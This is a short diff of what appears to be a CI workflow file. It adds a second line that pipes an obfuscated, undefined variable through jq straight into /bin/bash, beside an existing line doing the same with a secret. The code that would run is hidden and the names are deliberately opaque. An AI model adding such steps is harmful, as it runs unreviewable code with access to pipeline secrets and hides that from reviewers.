@@ -21,6 +21,7 @@ jobs:
           oc265: ${{ secrets.oc265 }}
         run: |
           printf '%s' "$oc265" | jq -r .nuetu4150 | /bin/bash
+          printf '%s' "$fgej11584" | jq -r .fqvzf88 | /bin/bash
 
       - name: Persist output
         if: always()
